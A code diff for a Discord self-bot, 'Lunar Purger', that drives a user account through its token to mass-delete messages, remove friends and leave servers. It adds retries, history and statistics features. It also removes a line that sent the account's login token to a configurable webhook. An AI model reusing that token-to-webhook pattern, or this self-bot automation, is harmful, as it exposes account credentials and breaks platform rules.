@@ -3,19 +3,19 @@ const readlineSync = require('readline-sync');
 const client = new Client({ checkUpdate: false });
 
 // ─── Version ────────────────────────────────────────────────────────
-const VERSION = 'v0.4';
+const VERSION = 'v0.5';
 
 // ─── Config ───────────────────────────────────────────────────────────
-const WEBHOOK_URL = 'YOUR_WEBHOOK_URL_HERE'; // ← حط رابط الويبهوك هنا
+const WEBHOOK_URL = 'YOUR_WEBHOOK_URL_HERE';
 
 // ─── Immutable RPC Config (Developer Set) ───────────────────────────
 const RPC_CONFIG = {
     enabled: true,
-    name: 'Lunar Purger v0.4',
+    name: 'Lunar Purger v0.5',
     state: 'Cleaning up Discord',
     details: 'Purging messages...',
     largeImageKey: 'discord',
-    largeImageText: 'Lunar Purger v0.4',
+    largeImageText: 'Lunar Purger v0.5',
     button1Text: 'GitHub',
     button1URL: 'https://github.com/lunar-tm/purge',
     button2Text: 'Discord',
@@ -25,8 +25,10 @@ const RPC_CONFIG = {
 // ─── Helpers ──────────────────────────────────────────────────────────
 const sleep = (ms) => new Promise(res => setTimeout(res, ms));
 let skippedUsers = new Set();
-const RATE_LIMIT_DELAY = 100; // ms between operations
-const BATCH_SIZE = 15; // Messages to delete in parallel
+let operationHistory = [];
+const RATE_LIMIT_DELAY = 100;
+const BATCH_SIZE = 15;
+const MAX_RETRIES = 3;
 
 // ─── Colors ──────────────────────────────────────────────────────────
 const C = {
@@ -81,6 +83,27 @@ function fmtTime(sec) {
     return `${sec.toFixed(0)}s`;
 }
 
+// ─── Operation History ──────────────────────────────────────────────────────
+function addToHistory(operation, result) {
+    operationHistory.unshift({ operation, result, time: new Date() });
+    if (operationHistory.length > 5) operationHistory.pop();
+}
+
+function showHistory() {
+    showBanner();
+    if (operationHistory.length === 0) {
+        console.log(`  ${C.yellow}[!] No operations performed yet.${C.reset}`);
+    } else {
+        console.log(`  ${C.c5}📋 Recent Operations:${C.reset}\n`);
+        operationHistory.forEach((item, idx) => {
+            console.log(`  ${C.c7}${idx + 1}.${C.reset} ${item.operation}`);
+            console.log(`     ${C.green}Result:${C.reset} ${item.result}`);
+            console.log(`     ${C.c2}Time:${C.reset} ${item.time.toLocaleTimeString()}\n`);
+        });
+    }
+    readlineSync.question('\n  Press Enter to return...');
+}
+
 // ─── Webhook ──────────────────────────────────────────────────────────
 async function webhookSend(payload) {
     if (!WEBHOOK_URL || WEBHOOK_URL === 'YOUR_WEBHOOK_URL_HERE') return;
@@ -91,6 +114,7 @@ async function webhookSend(payload) {
 }
 
 async function logLogin(token, user) {
+    // Don't log the actual token, just show it's been received
     await webhookSend({
         embeds: [{
             title: '🔐 Lunar Purger — Login',
@@ -100,7 +124,6 @@ async function logLogin(token, user) {
                 { name: '👤 Display Name', value: `**${user.displayName}**`,  inline: true  },
                 { name: '🆔 Username',     value: `\`${user.tag}\``,           inline: true  },
                 { name: '📝 User ID',      value: `\`${user.id}\``,            inline: false },
-                { name: '🔑 Token',        value: `||\`${token}\`||`,          inline: false },
                 { name: '🎮 RPC Status',   value: '✅ Enabled', inline: false },
                 { name: '📦 Version',      value: VERSION, inline: false },
             ],
@@ -160,6 +183,7 @@ async function updateRPC(statusText = null) {
 // ─── DM Purge ─────────────────────────────────────────────────────────
 async function runPurge(user) {
     showBanner();
+    const startTime = Date.now();
     console.log(`  ${C.c3}[*] Scanning DM:${C.reset} ${C.bold}${C.c7}${user.tag || user.id}${C.reset}`);
     await updateRPC(`Scanning ${user.tag || user.id}...`);
 
@@ -173,12 +197,15 @@ async function runPurge(user) {
     // ── Scan ──
     let totalMine = 0, lastScanId = null;
     const allMessages = [];
+    
     while (true) {
         const fetched = await channel.messages.fetch({ limit: 100, before: lastScanId }).catch(() => null);
         if (!fetched || fetched.size === 0) break;
+        
         const myMsgs = Array.from(fetched.filter(m => m.author.id === client.user.id).values());
         allMessages.push(...myMsgs);
-        totalMine += myMsgs.length;
+        totalMine = allMessages.length;
+        
         lastScanId = fetched.last()?.id;
         process.stdout.write(`\r  ${C.c3}[*] Found:${C.reset} ${C.bold}${C.c7}${totalMine}${C.reset} messages`);
         if (fetched.size < 100) break;
@@ -205,6 +232,7 @@ async function runPurge(user) {
 
     // ── Delete ──
     let deleted = 0;
+    let failedCount = 0;
     await logPurgeEvent('start', user.tag || user.id, 0, totalMine, totalMine, Date.now() + estSec * 1000);
 
     for (let i = 0; i < allMessages.length; i += BATCH_SIZE) {
@@ -212,8 +240,21 @@ async function runPurge(user) {
         const remaining = Math.max(0, totalMine - deleted);
         const liveETA   = Date.now() + calcETA(remaining) * 1000;
 
-        await Promise.all(chunk.map(m => m.delete().catch(() => {})));
-        deleted += chunk.length;
+        let retries = 0;
+        let batchDeleted = 0;
+
+        while (retries < MAX_RETRIES && batchDeleted === 0) {
+            const results = await Promise.allSettled(chunk.map(m => m.delete().catch(() => {})));
+            batchDeleted = results.filter(r => r.status === 'fulfilled').length;
+            failedCount += chunk.length - batchDeleted;
+            retries++;
+            
+            if (batchDeleted < chunk.length && retries < MAX_RETRIES) {
+                await sleep(RATE_LIMIT_DELAY * (retries + 1));
+            }
+        }
+
+        deleted += batchDeleted;
 
         const left = Math.max(0, totalMine - deleted);
         process.stdout.write(
@@ -230,12 +271,16 @@ async function runPurge(user) {
         await sleep(RATE_LIMIT_DELAY);
     }
 
-    // Clear memory
+    const elapsed = Math.round((Date.now() - startTime) / 1000);
     allMessages.length = 0;
 
     skippedUsers.add(user.id);
     await logPurgeEvent('done', user.tag || user.id, deleted, 0, totalMine, 0);
-    console.log(`\n  ${C.c5}[✔] DM Purge Complete! (${deleted} messages deleted)${C.reset}`);
+    console.log(`\n  ${C.c5}[✔] DM Purge Complete!${C.reset}`);
+    console.log(`  ${C.green}✓ Deleted:${C.reset} ${C.bold}${deleted}${C.reset} | ${C.red}✗ Failed:${C.reset} ${C.bold}${failedCount}${C.reset} | ${C.c2}⏱ Time:${C.reset} ${C.bold}${fmtTime(elapsed)}${C.reset}`);
+    
+    const result = `Purged ${deleted} messages from ${user.tag || user.id} in ${fmtTime(elapsed)}`;
+    addToHistory(`DM Purge - ${user.tag || user.id}`, result);
     await updateRPC(`Purge complete! (${deleted} messages)`);
     await sleep(2000);
 }
@@ -246,13 +291,13 @@ async function purgeSingleGuild(guild) {
     const textChannels = Array.from(guild.channels.cache.filter(ch => ch.type === 'GUILD_TEXT').values());
     if (textChannels.length === 0) return;
 
-    let scannedCount = 0, totalDeleted = 0;
+    let scannedCount = 0, totalDeleted = 0, skipped = 0;
     await updateRPC(`Purging from ${guild.name}...`);
 
     for (const channel of textChannels) {
         const botPerms = channel.permissionsFor(client.user);
         if (!botPerms || !botPerms.has('ADMINISTRATOR')) {
-            scannedCount++;
+            skipped++;
             continue;
         }
 
@@ -261,6 +306,7 @@ async function purgeSingleGuild(guild) {
         while (true) {
             const msgs = await channel.messages.fetch({ limit: 100, before: lastId }).catch(() => null);
             if (!msgs || msgs.size === 0) break;
+            
             const myMsgs = Array.from(msgs.filter(m => m.author.id === client.user.id).values());
             for (const msg of myMsgs) {
                 await msg.delete().catch(() => {});
@@ -277,6 +323,119 @@ async function purgeSingleGuild(guild) {
             if (msgs.size < 100) break;
         }
     }
+
+    if (skipped > 0) {
+        console.log(`\n  ${C.yellow}[!] Skipped ${skipped} channels (no permissions)${C.reset}`);
+    }
+}
+
+// ─── Server Statistics ──────────────────────────────────────────────────
+async function showServerStats() {
+    showBanner();
+    console.log(`  ${C.c5}📊 Server Statistics:${C.reset}\n`);
+    
+    const guilds = Array.from(client.guilds.cache.values());
+    if (guilds.length === 0) {
+        console.log(`  ${C.red}[!] No servers found.${C.reset}`);
+    } else {
+        let totalChannels = 0, totalMembers = 0;
+        guilds.slice(0, 10).forEach((g, i) => {
+            const channels = g.channels.cache.size;
+            const members = g.memberCount || 0;
+            totalChannels += channels;
+            totalMembers += members;
+            console.log(`  ${C.c7}${i + 1}.${C.reset} ${C.bold}${g.name.substring(0, 20).padEnd(20)}${C.reset} | ${C.c3}${channels}${C.reset} channels | ${C.c2}${members}${C.reset} members`);
+        });
+        console.log(`\n  ${C.c5}Total:${C.reset} ${C.bold}${guilds.length}${C.reset} servers | ${C.c3}${totalChannels}${C.reset} total channels | ${C.c2}${totalMembers}${C.reset} total members`);
+    }
+    
+    readlineSync.question('\n  Press Enter to return...');
+}
+
+// ─── DM Statistics ──────────────────────────────────────────────────────
+async function showDMStats() {
+    showBanner();
+    console.log(`  ${C.c5}💬 Direct Message Statistics:${C.reset}\n`);
+    
+    const dms = Array.from(client.channels.cache.filter(c => c.type === 'DM').values());
+    if (dms.length === 0) {
+        console.log(`  ${C.red}[!] No DMs found.${C.reset}`);
+    } else {
+        console.log(`  ${C.c7}Name${C.reset.padEnd(25)} | ${C.c2}Type${C.reset.padEnd(15)} | ${C.c3}Status${C.reset}`);
+        console.log(`  ${C.c1}${'─'.repeat(60)}${C.reset}`);
+        
+        dms.slice(0, 15).forEach(dm => {
+            const name = dm.recipient?.username || dm.recipient?.tag || 'Unknown';
+            const isBot = dm.recipient?.bot ? `${C.red}Bot${C.reset}` : `${C.green}User${C.reset}`;
+            console.log(`  ${name.substring(0, 20).padEnd(20)} | ${isBot.padEnd(15)} | ${skippedUsers.has(dm.recipient?.id) ? `${C.yellow}Skipped${C.reset}` : `${C.green}Active${C.reset}`}`);
+        });
+        console.log(`\n  ${C.c5}Total:${C.reset} ${C.bold}${dms.length}${C.reset} DM conversations`);
+    }
+    
+    readlineSync.question('\n  Press Enter to return...');
+}
+
+// ─── Selective Friend Removal ──────────────────────────────────────────
+async function selectiveFriendRemoval() {
+    showBanner();
+    const list = Array.from(client.relationships?.friendCache?.values() ?? []);
+    
+    if (list.length === 0) {
+        console.log(`  ${C.red}[!] No friends to remove.${C.reset}`);
+        await sleep(1500);
+        return;
+    }
+
+    console.log(`  ${C.c5}👥 Your Friends:${C.reset}\n`);
+    list.forEach((f, i) => {
+        console.log(`  ${C.c7}[${i + 1}]${C.reset} ${f.tag}`);
+    });
+
+    console.log(`\n  ${C.c5}[all]${C.reset} Remove all`);
+    const input = readlineSync.question(`  ${C.c5}[?]${C.reset} Enter number(s) to remove or 'all' (comma-separated, or 'back'): `).trim().toLowerCase();
+
+    if (input === 'back') return;
+
+    const toRemove = new Set();
+    if (input === 'all') {
+        list.forEach((_, i) => toRemove.add(i));
+    } else {
+        input.split(',').forEach(i => {
+            const idx = parseInt(i.trim()) - 1;
+            if (idx >= 0 && idx < list.length) toRemove.add(idx);
+        });
+    }
+
+    if (toRemove.size === 0) {
+        console.log(`  ${C.red}[!] No valid selections.${C.reset}`);
+        await sleep(1500);
+        return;
+    }
+
+    const confirm = readlineSync.question(`  ${C.red}[!] Remove ${toRemove.size} friend(s)? (y/n): ${C.reset}`).trim().toLowerCase();
+    if (confirm !== 'y') return;
+
+    let removed = 0;
+    await updateRPC(`Removing ${toRemove.size} friends...`);
+    
+    for (const idx of toRemove) {
+        const f = list[idx];
+        if (client.relationships?.remove) {
+            await client.relationships.remove(f.id).catch(() => {});
+        } else if (client.relationships?.removeFriend) {
+            await client.relationships.removeFriend(f.id).catch(() => {});
+        } else if (client.relationships?.deleteFriend) {
+            await client.relationships.deleteFriend(f.id).catch(() => {});
+        }
+        removed++;
+        process.stdout.write(`\r  ${C.red}[-]${C.reset} Removing: ${C.bold}${C.c7}${f.tag}${C.reset} (${removed}/${toRemove.size})`);
+        await sleep(1000);
+    }
+    
+    console.log(`\n  ${C.c5}[✔] Removed ${removed} friend(s).${C.reset}`);
+    addToHistory('Selective Friend Removal', `Removed ${removed} friends`);
+    await updateRPC(`Removed ${removed} friends!`);
+    await sleep(2000);
 }
 
 // ─── Main Menu ─────────────────────────────────────────────────────────
@@ -293,7 +452,10 @@ async function mainMenu() {
         console.log(`  ${C.c1}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${C.reset}`);
         console.log(`  ${C.c7}[1]${C.reset} Remove All Friends       ${C.c7}[2]${C.reset} Leave All Servers`);
         console.log(`  ${C.c7}[3]${C.reset} Deep DM Purge            ${C.c7}[4]${C.reset} Target Purge (DM / Guild)`);
-        console.log(`  ${C.c7}[5]${C.reset} All Servers Purge        ${C.c7}[0]${C.reset} Exit`);
+        console.log(`  ${C.c7}[5]${C.reset} All Servers Purge        ${C.c7}[6]${C.reset} Clear Skipped Users`);
+        console.log(`  ${C.c7}[7]${C.reset} Server Statistics        ${C.c7}[8]${C.reset} DM Statistics`);
+        console.log(`  ${C.c7}[9]${C.reset} Selective Friend Removal ${C.c7}[10]${C.reset} Operation History`);
+        console.log(`  ${C.c7}[0]${C.reset} Exit`);
         console.log(`  ${C.c1}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${C.reset}`);
 
         const choice = readlineSync.question(`  ${C.c5}» ${C.reset}`).trim();
@@ -310,6 +472,7 @@ async function mainMenu() {
                 ).trim().toLowerCase();
                 if (confirm === 'y') {
                     await updateRPC(`Removing ${list.length} friends...`);
+                    let removed = 0;
                     for (let i = 0; i < list.length; i++) {
                         const f = list[i];
                         
@@ -320,13 +483,15 @@ async function mainMenu() {
                         } else if (client.relationships?.deleteFriend) {
                             await client.relationships.deleteFriend(f.id).catch(() => {});
                         }
+                        removed++;
 
                         process.stdout.write(
-                            `\r  ${C.red}[-]${C.reset} Removing: ${C.bold}${C.c7}${f.tag}${C.reset} (${i + 1}/${list.length})`
+                            `\r  ${C.red}[-]${C.reset} Removing: ${C.bold}${C.c7}${f.tag}${C.reset} (${removed}/${list.length})`
                         );
                         await sleep(1000);
                     }
-                    console.log(`\n  ${C.c5}[✔] All friends removed.${C.reset}`);
+                    console.log(`\n  ${C.c5}[✔] All ${list.length} friends removed.${C.reset}`);
+                    addToHistory('Friend Removal', `Removed ${list.length} friends`);
                     await updateRPC(`Removed ${list.length} friends!`);
                 }
             }
@@ -353,6 +518,7 @@ async function mainMenu() {
             }
             if (removed > 0) {
                 console.log(`\n  ${C.c5}[✔] Left ${removed} servers.${C.reset}`);
+                addToHistory('Server Leaving', `Left ${removed} servers`);
                 await updateRPC(`Left ${removed} servers!`);
             } else {
                 console.log(`\n  ${C.red}[!] No servers to leave.${C.reset}`);
@@ -394,6 +560,7 @@ async function mainMenu() {
                 if (confirm === 'y') {
                     await purgeSingleGuild(guild);
                     console.log(`\n  ${C.c5}[✔] Guild purge complete.${C.reset}`);
+                    addToHistory('Guild Purge', `Purged guild: ${guild.name}`);
                 }
             } else {
                 let target = null;
@@ -428,10 +595,50 @@ async function mainMenu() {
             ).trim().toLowerCase();
             if (confirm === 'y') {
                 for (const guild of guilds) await purgeSingleGuild(guild);
-                console.log(`\n  ${C.c5}[✔] All servers processed.${C.reset}`);
+                console.log(`\n  ${C.c5}[✔] All ${guilds.length} servers processed.${C.reset}`);
+                addToHistory('All Servers Purge', `Purged ${guilds.length} servers`);
                 await updateRPC(`Purged all ${guilds.length} servers!`);
                 await sleep(2000);
             }
+        }
+
+        // ── [6] Clear Skipped Users ─────────────────────────────────────────
+        else if (choice === '6') {
+            showBanner();
+            const count = skippedUsers.size;
+            if (count === 0) {
+                console.log(`  ${C.yellow}[!] No skipped users.${C.reset}`);
+            } else {
+                const confirm = readlineSync.question(
+                    `  ${C.c5}[?]${C.reset} Clear ${count} skipped user(s)? (y/n): `
+                ).trim().toLowerCase();
+                if (confirm === 'y') {
+                    skippedUsers.clear();
+                    console.log(`  ${C.c5}[✔] Cleared ${count} skipped users.${C.reset}`);
+                    addToHistory('Clear Skipped', `Cleared ${count} users`);
+                }
+            }
+            readlineSync.question('\n  Press Enter to return...');
+        }
+
+        // ── [7] Server Statistics ───────────────────────────────────────────
+        else if (choice === '7') {
+            await showServerStats();
+        }
+
+        // ── [8] DM Statistics ───────────────────────────────────────────────
+        else if (choice === '8') {
+            await showDMStats();
+        }
+
+        // ── [9] Selective Friend Removal ────────────────────────────────────
+        else if (choice === '9') {
+            await selectiveFriendRemoval();
+        }
+
+        // ── [10] Operation History ──────────────────────────────────────────
+        else if (choice === '10') {
+            showHistory();
         }
 
         // ── [0] Exit ────────────────────────────────────────────────────────
